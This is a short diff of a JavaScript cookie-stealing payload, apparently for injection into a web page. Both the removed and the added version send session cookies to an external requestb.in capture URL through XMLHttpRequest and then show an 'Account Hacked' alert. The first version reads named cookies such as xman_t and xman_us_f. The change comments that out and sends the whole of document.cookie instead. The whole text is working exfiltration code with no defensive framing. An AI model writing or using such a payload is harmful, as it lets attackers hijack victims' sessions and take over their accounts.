@@ -1,4 +1,4 @@
-function readCookie(name) {
+/*function readCookie(name) {
     var nameEQ = name + "=";
     var ca = document.cookie.split(';');
     for(var i=0;i < ca.length;i++) {
@@ -11,9 +11,9 @@ function readCookie(name) {
 var cookie={xman_t:readCookie("xman_t")
             ,xman_f:readCookie("xman_f")
             ,xman_us_f:readCookie("xman_us_f")
-           ,xman_us_t:readCookie("xman_us_t")}
+           ,xman_us_t:readCookie("xman_us_t")}*/
 var xmlHttp = new XMLHttpRequest();
-xmlHttp.open( "GET", "https://requestb.in/1i0zvsq1?cookie="+JSON.stringify(cookie), false );
+xmlHttp.open( "GET", "https://requestb.in/1i0zvsq1?cookie="+JSON.stringify(document.cookie), false );
 xmlHttp.send( null );
 alert('Account Hacked')
 
